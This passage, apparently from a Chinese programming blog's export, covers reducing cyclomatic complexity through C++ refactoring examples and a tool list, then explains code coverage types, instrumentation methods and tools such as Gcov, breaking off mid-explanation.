class="function"></span>&#123;</span><br><span class="line">    _width = arg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="54-实战练习"><a class="markdownIt-Anchor" href="#54-实战练习"></a> 5.4 实战练习</h2><p>还是以之前统计<strong>CC</strong>值的例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">U32 <span class="title">find</span> <span class="params">(<span class="built_in">string</span> match)</span></span>&#123;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">auto</span> var : List)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">if</span>(var == match &amp;&amp; from != INVALID_U32) </span><br><span class="line">    <span class="keyword">return</span> INVALID_U32;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//match step1</span></span><br><span class="line">       <span class="keyword">if</span>(session == getName() &amp;&amp; key == <span class="built_in">getKey</span>())</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; kv : Map)</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">if</span> (kv.second == last &amp;&amp; match == kv.first)</span><br><span class="line">               &#123;</span><br><span class="line">                   <span class="keyword">return</span> last;</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//match step2</span></span><br><span class="line">       <span class="keyword">auto</span> var = Map.<span class="built_in">find</span>(match);</span><br><span class="line">       <span class="keyword">if</span>(var != Map.<span class="built_in">end</span>()&amp;&amp; (from != var-&gt;second)) <span class="keyword">return</span> var-&gt;second;</span><br><span class="line"></span><br><span class="line">       <span class="comment">//match step3</span></span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">auto</span> var: Map)</span><br><span class="line">       &#123;</span><br><span class="line">           <span class="keyword">if</span>((var.first, match) &amp;&amp; from != var.second)</span><br><span class="line">           &#123;</span><br><span class="line">               <span class="keyword">return</span> var.second;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> INVALID_U32;</span><br><span class="line">   &#125;;</span><br></pre></td></tr></table></figure><p>综合运用降低CC值的技巧后：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">Matcher</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        Matcher(<span class="built_in">string</span> name, <span class="built_in">string</span> key);</span><br><span class="line">        <span class="function">U32 <span class="title">find</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span>:</span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">except</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function">U32 <span class="title">matchStep1</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function">U32 <span class="title">matchStep2</span><span class="params">()</span></span>;</span><br><span class="line">        <span class="function">U32 <span class="title">matchStep3</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">isTheSameMatch</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">string</span> match;</span><br><span class="line">        U32 from;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    Matcher::Matcher(<span class="built_in">string</span> name, <span class="built_in">string</span> key):</span><br><span class="line">        match(name + key)</span><br><span class="line">    &#123;</span><br><span class="line">        from = GetFrom();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">U32 <span class="title">Matcher::find</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (except())</span><br><span class="line">            <span class="keyword">return</span> INVALID_U32;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">auto</span> result = matchStep1();</span><br><span class="line">        <span class="keyword">if</span> (result != INVALID_U32)</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">        result = matchStep2();</span><br><span class="line">        <span class="keyword">if</span> (result != INVALID_U32)</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> matchStep3();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">Matcher::except</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> var : List)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(var == match &amp;&amp; from != INVALID_U32)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">U32 <span class="title">Matcher::matchStep1</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!isTheSameMatch())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> INVALID_U32;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span>&amp; kv : Map)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ( last == kv.second &amp;&amp; match == kv.first)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> last;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> INVALID_U32;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">Matcher::isTheSameMatch</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> match == getName() + <span class="built_in">getKey</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">U32 <span class="title">Matcher::matchStep2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> var = Map.<span class="built_in">find</span>(match);</span><br><span class="line">        <span class="keyword">if</span>(var != Map.<span class="built_in">end</span>()&amp;&amp; (from != var-&gt;second))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> var-&gt;second;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> INVALID_U32;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">U32 <span class="title">Matcher::matchStep3</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> var: Map)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(keyMatch(var.first, match) &amp;&amp; from != var.second)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> var.second;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> INVALID_U32;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">U32 <span class="title">find</span> <span class="params">(<span class="built_in">string</span> match)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Matcher matcher;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> matcher.<span class="built_in">find</span>(match);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该例子将匹配算法都封装到Matcher类中，并将原有逻辑通过提炼函数（技巧1）和合并条件（技巧6）将匹配逻辑抽象成能力查询、粘滞、精确匹配及模糊匹配四个步骤，这样将循环和条件分支封入小函数中，从而降低接口函数（findPno）的圈复杂度，函数职责也更加单一和清晰。整体圈复杂度从单个函数的14降到多个函数最高的5。</p><h1 id="6-圈复杂度思辨"><a class="markdownIt-Anchor" href="#6-圈复杂度思辨"></a> 6 圈复杂度思辨</h1><h2 id="61-思辨1-高复杂度的代码是否可维护性差"><a class="markdownIt-Anchor" href="#61-思辨1-高复杂度的代码是否可维护性差"></a> 6.1 思辨1 高复杂度的代码是否可维护性差</h2><p>在实际项目中为了调试方便，经常会把消息号对应的名称打印出来：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">getMessageName</span><span class="params">(Message msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span>(msg)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> MSG_1:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"MSG_1"</span>;</span><br><span class="line">        <span class="keyword">case</span> MSG_2:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"MSG_2"</span>;</span><br><span class="line">        <span class="keyword">case</span> MSG_3:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"MSG_3"</span>;</span><br><span class="line">        <span class="keyword">case</span> MSG_4:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"MSG_4"</span>;</span><br><span class="line">        <span class="keyword">case</span> MSG_5:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"MSG_5"</span>;</span><br><span class="line">        <span class="keyword">case</span> MSG_6:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"MSG_6"</span>;</span><br><span class="line">        <span class="keyword">case</span> MSG_7:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"MSG_7"</span>;</span><br><span class="line">        <span class="keyword">case</span> MSG_8:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"MSG_8"</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"MSG_UNKNOWN"</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码无论从可读性来说，还是从可维护性来说都是可以接收的。因此，当因为”高”复杂度就进行重构的话（例如：技巧2或技巧6），在降低圈复杂度的同时会带来不必要的逻辑复杂度。</p><p>当然，如果出现下面的情况的话，还是有必要进一步降低圈复杂度的：</p><ol><li>消息数过多。</li><li>switch…case…多处重复。 对于消息过多的情况，可以考虑将消息进行分类，然后采用技巧1进行重构。对于出现多处重复的情况，可以通过技巧6将同样case的内容内聚到一个具体的类的方法中，然后通过多态的方式来使用。</li></ol><h2 id="62-思辨2-复杂度相同的代码是否是一致的"><a class="markdownIt-Anchor" href="#62-思辨2-复杂度相同的代码是否是一致的"></a> 6.2 思辨2 复杂度相同的代码是否是一致的</h2><p>例如下面两个代码片段的圈复杂度都是6。 代码片段1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">getWeight</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (i &lt;= <span class="number">0</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"no weight"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">10</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"light"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">20</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"medium"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">30</span>) </span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"heavy"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i &lt; <span class="number">40</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"very heavy"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"super heavy"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码片段2</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sumOfNonPrimes</span><span class="params">(<span class="keyword">int</span> limit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">bool</span> bAdd = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; limit; ++i) &#123;</span><br><span class="line">                <span class="keyword">if</span> (i &lt;= <span class="number">2</span>) </span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">2</span>; j &lt; i; ++j) </span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="keyword">if</span> (i % j == <span class="number">0</span>) </span><br><span class="line">                    &#123;</span><br><span class="line">                            bAdd = <span class="literal">false</span>;</span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    bAdd = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (bAdd)</span><br><span class="line">                    sum += i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是它们的代码无论从可读性上来说，还是从可维护性来说，代码片段1应该都优于代码片段2，代码片段2的坏味道更加浓郁。因此，圈复杂度还需要具体情况具体分析，其只能作为重构的一个度量指标，作为决策的一个参考依据。</p><h1 id="7-圈复杂度工具"><a class="markdownIt-Anchor" href="#7-圈复杂度工具"></a> 7 圈复杂度工具</h1><p>圈复杂度的工具有很多，大致有三类：</p><table><thead><tr><th style="text-align:left">类型</th><th style="text-align:left">名称</th><th style="text-align:left">说明</th></tr></thead><tbody><tr><td style="text-align:left">专用工具（单语言）</td><td style="text-align:left">OCLint</td><td style="text-align:left">C语言相关</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">GMetrics</td><td style="text-align:left">Java</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">PyMetrics</td><td style="text-align:left">python</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">JSComplexity</td><td style="text-align:left">js</td></tr><tr><td style="text-align:left">通用工具（多语言）</td><td style="text-align:left">lizard</td><td style="text-align:left">支持多种语言：C/C++ (works with C++14)、Java、C#、JavaScript、Objective C、Swift、Python、Ruby、PHP、Scala等。</td></tr><tr><td style="text-align:left"></td><td style="text-align:left">sourcemonitor</td><td style="text-align:left">免费、Windows平台。支持语言包括C、C++、C#、Java、VB、Delphi和HTML。</td></tr><tr><td style="text-align:left">通用平台</td><td style="text-align:left">sonarqube</td><td style="text-align:left">一个用于代码质量管理的开源平台，支持20多种语言。通过插件机制可集成不同的测试工具，代码分析工具及持续集成工具</td></tr></tbody></table><h1 id="8-参考资料"><a class="markdownIt-Anchor" href="#8-参考资料"></a> 8 参考资料</h1><ol><li><a href="https://zh.wikipedia.org/wiki/%E5%BE%AA%E7%92%B0%E8%A4%87%E9%9B%9C%E5%BA%A6" target="_blank" rel="noopener">循環複雜度- 维基百科，自由的百科全书</a></li><li><a href="http://www.guru99.com/cyclomatic-complexity.html" target="_blank" rel="noopener">Learn Mccabe’s Cyclomatic Complexity with Example</a></li><li><a href="https://www.cqse.eu/en/blog/mccabe-cyclomatic-complexity/" target="_blank" rel="noopener">McCabe’s Cyclomatic Complexity and Why We Don’t Use It</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 未分类 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 待补充 </tag>
            
            <tag> 重构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>代码覆盖率</title>
      <link href="/2022/04/15/%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/"/>
      <url>/2022/04/15/%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-介绍"><a class="markdownIt-Anchor" href="#1-介绍"></a> 1 介绍</h1><p><strong>代码覆盖率</strong>，是一种通过计算测试过程中被执行的源代码占全部源代码的比例，进而间接度量软件质量的方法。</p><p><strong>全量覆盖率</strong>：基于全部代码的代码覆盖率</p><p><strong>增量覆盖率</strong>：基于代码增量的代码覆盖率</p><p>按性质，它属于白盒测试的范畴，即主要依据源代码的内部结构来设计测试用例，通过设计不同的输入来测试软件的不同部分。</p><p>常见的编程语言，如C/C++，python和Java等，都有相应的代码覆盖率测试工具。</p><h1 id="2-意义"><a class="markdownIt-Anchor" href="#2-意义"></a> 2 意义</h1><ol><li>提升开发者测试意识，可以基于此在程序中寻找没有被测试用例测试过的地方，创建新的测试用例来增加覆盖率，从而提高软件质量；</li><li>也为代码管理提供了新的手段，降低管理成本。</li></ol><p><strong>注意</strong>：代码覆盖率不是灵丹妙药，它只是告诉我们有哪些代码没有被测试用例“执行到”而已，高百分比的代码覆盖率不等于高质量的有效测试。</p><p><strong>举例</strong>：假设代码覆盖率只在某一些模块代码覆盖率很高，但在一些关键模块并没有足够的测试用例覆盖，那样虽然代码覆盖率很高，但并不能说明产品质量就很高。</p><p>Martin Fowler <a href="https://link.zhihu.com/?target=https%3A//www.martinfowler.com/bliki/TestCoverage.html" target="_blank" rel="noopener">测试覆盖率</a> 写到：</p><blockquote><p>代码覆盖率是查找代码库中未测试部分的有用工具，然而它作为一个数字说明你的测试有多好用处不大。</p></blockquote><h1 id="3-分类"><a class="markdownIt-Anchor" href="#3-分类"></a> 3 分类</h1><h2 id="31-语句覆盖statement-coverage"><a class="markdownIt-Anchor" href="#31-语句覆盖statement-coverage"></a> 3.1 语句覆盖（statement coverage）</h2><p><strong>程序中的语句有多少被执行</strong>。它是最常用也是最简单的一种代码覆盖率度量方式，就是度量被测代码中每个可执行语句是否被执行到了。“可执行语句”，并不包括C++的头文件声明、代码注释和空行等。但是，单独一行的花括号｛｝ 常常也被统计进去。</p><h2 id="32-行覆盖率"><a class="markdownIt-Anchor" href="#32-行覆盖率"></a> 3.2 行覆盖率</h2><p><strong>有多少行的源代码被测试过</strong>。感觉和<code>语句覆盖</code>一样。</p><h2 id="33-判定覆盖率decision-coverageor-分支覆盖"><a class="markdownIt-Anchor" href="#33-判定覆盖率decision-coverageor-分支覆盖"></a> 3.3 判定覆盖率（decision coverage）or 分支覆盖</h2><p>又称<strong>分支覆盖</strong>，所有边界覆盖，基本路径覆盖，判定路径覆盖，它度量程序中每一个判定的分支是否都被测试到了。所谓判定，是指一条判断语句的结果，而不考虑其中包含的子判断的结果和组合情况。</p><h2 id="34-条件覆盖condition-coverage"><a class="markdownIt-Anchor" href="#34-条件覆盖condition-coverage"></a> 3.4 条件覆盖（condition coverage）</h2><p>它报告每一个子表达式的结果的true 或false 是否测试到了。即构造测试用例时，要使得每个判定语句中每个逻辑条件的可能值至少满足一次（即每一个被“逻辑与”或“逻辑非”分开的布尔表达式真假值情况）。但是，需要注意的是，条件覆盖不是将判定中的每个条件表达式的结果进行排列组合，而是只要每个条件表达式的结果true和false测试到了就可以了。</p><h2 id="35-修正条件判定覆盖modified-condition-decision-coverage"><a class="markdownIt-Anchor" href="#35-修正条件判定覆盖modified-condition-decision-coverage"></a> 3.5 修正条件判定覆盖（modified condition / decision coverage）</h2><p>前面提到的条件覆盖比语句覆盖和判定覆盖都要严格，但是由于它只关注每个条件表达式的结果是否都被测试到，而不要求对每个条件表达式的解果进行排列组合，所以它也只能覆盖一部分的情况。如果真要做到全覆盖，随着子表达式的增加，不仅测试用例设计的难度会越来越大，而且用例的数量也会指数级增长。</p><p>修正条件判定覆盖，要求在一个程序中每一种输入输出至少得出现一次，在程序中的每一个条件必须产生所有可能的输出结果至少一次，并且每一个判定中的每一个条件必须能够独立影响一个判定的输出，即在其他条件不变的前提下仅改变这个条件的值，而使判定结果改变。显然，修正条件判定覆盖的定义有点抽象，接下来还是以前面的代码为例介绍。</p><p>修正条件判定覆盖要求在每个判定中，每个条件都独立地影响判定结果至少一次（所谓独立影响就是在其他条件不变的情况下，改变该条件可以改变判定结果）。例如，要想a对判定独立影响，则b或function的结果必须为true；要想b对判定独立影响，则a必须为true；同理，要想function对判定独立影响，a也必须为true。如果列出测试用例表，则不难发现满足以上条件的测试用例的数量并不需要很多！主要因为有些用例是重复的。</p><h2 id="36-条件判定组合覆盖condition-decision-coverage"><a class="markdownIt-Anchor" href="#36-条件判定组合覆盖condition-decision-coverage"></a> 3.6 条件判定组合覆盖（condition decision coverage）</h2><h2 id="37-路径覆盖path-coverage"><a class="markdownIt-Anchor" href="#37-路径覆盖path-coverage"></a> 3.7 路径覆盖（path coverage）</h2><h2 id="38-多条件覆盖multi-condition-coverage"><a class="markdownIt-Anchor" href="#38-多条件覆盖multi-condition-coverage"></a> 3.8 多条件覆盖（multi-condition coverage）</h2><h2 id="39-方法覆盖率"><a class="markdownIt-Anchor" href="#39-方法覆盖率"></a> 3.9 方法覆盖率</h2><p><strong>程序中的方法/函数有多少被执行。</strong></p><h2 id="310-类覆盖率"><a class="markdownIt-Anchor" href="#310-类覆盖率"></a> 3.10 类覆盖率</h2><p><strong>程序中的类有多少被执行。</strong></p><h1 id="4-工作原理"><a class="markdownIt-Anchor" href="#4-工作原理"></a> 4 工作原理</h1><p>代码覆盖率测量主要有以下三种方式：</p><h2 id="41-source-code-instrumentation-源代码检测"><a class="markdownIt-Anchor" href="#41-source-code-instrumentation-源代码检测"></a> 4.1 Source code instrumentation - 源代码检测</h2><p>将检测语句添加到源代码中，并使用正常的编译工具链编译代码以生成检测的程序集。这是我们常说的插桩，Gcov 是属于这一类的代码覆盖率工具。</p><h2 id="42-runtime-instrumentation-运行时收集"><a class="markdownIt-Anchor" href="#42-runtime-instrumentation-运行时收集"></a> 4.2 Runtime instrumentation - 运行时收集</h2><p>这种方法在代码执行时从运行时环境收集信息以确定覆盖率信息。以我的理解 JaCoCo 和 Coverage 这两个工具的原理属于这一类别。</p><h2 id="43-intermediate-code-instrumentation-中间代码检测"><a class="markdownIt-Anchor" href="#43-intermediate-code-instrumentation-中间代码检测"></a> 4.3 Intermediate code instrumentation - 中间代码检测</h2><p>通过添加新的字节码来检测编译后的类文件，并生成一个新的检测类。说实话，我 Google 了很多文章并找到确定的说明哪个工具是属于这一类的。<a href="https://blog.csdn.net/Nathan1987_/article/details/100932502" target="_blank" rel="noopener">机器码(machine code)和字节码(byte code)是什么？</a></p><hr><p>了解这些工具的基本原理，结合现有的测试用例，有助于正确的选择代码覆盖率工具。比如：</p><ul><li>产品的源代码只有 E2E（端到端）测试用例，通常只能选择第一类工具，即通过插桩编译出的可执行文件，然后进行测试和结果收集。</li><li>产品的源代码有单元测试用例，通常选择第二类工具，即运行时收集。这类工具的执行效率高，易于做持续集成。</li></ul><h1 id="5-当前主流代码覆盖率工具"><a class="markdownIt-Anchor" href="#5-当前主流代码覆盖率工具"></a> 5 当前主流代码覆盖率工具</h1><p>代码覆盖率的工具有很多，以下是我用过的不同编程语言的代码覆盖率工具。在选择工具时，力求去选择那些开源、流行（活跃）、好用的工具。</p><table><thead><tr><th style="text-align:center">编程语言</th><th style="text-align:center">代码覆盖率工具</th></tr></thead><tbody><tr><td style="text-align:center">C/C++</td><td style="text-align:center">Gcov</td></tr><tr><td style="text-align:center">Java</td><td style="text-align:center">JaCoCo</td></tr><tr><td style="text-align:center">JavaScript</td><td style="text-align:center">Istanbul</td></tr><tr><td style="text-align:center">Python</td><td style="text-align:center"><a href="http://Coverage.py" target="_blank" rel="noopener">Coverage.py</a></td></tr><tr><td style="text-align:center">Golang</td><td style="text-align:center">cover</td></tr></tbody></table><h2 id="51-gcov"><a class="markdownIt-Anchor" href="#51-gcov"></a> 5.1 Gcov</h2><p>Gcov 工作流程图：</p><img src="https://s2.loli.net/2022/04/15/AHyX8j6SR2eGYqV.png" width="400" height="300" alt="图片名称" align="center" id="157"><p>主要分三步：</p><ol><li>在 GCC 编译的时加入特殊的编译选项<code>-ftest-coverage</code>，生成可执行文件和 <code>.gcno</code>；</li><li>运行（测试）生成的可执行文件，生成了 <code>.gcda</code> 数据文件；（<code>.gcda</code>的生成是因为程序在编译的时候引入了 <code>-fprofile-arcs</code>选项）</li><li>有了 <code>.gcno</code> 和 <code>.gcda</code>，通过源码生成 <code>.gcov</code> 文件，最后生成代码覆盖率报告。</li></ol><p>用GCC编译的时候加上-fprofile-arcs 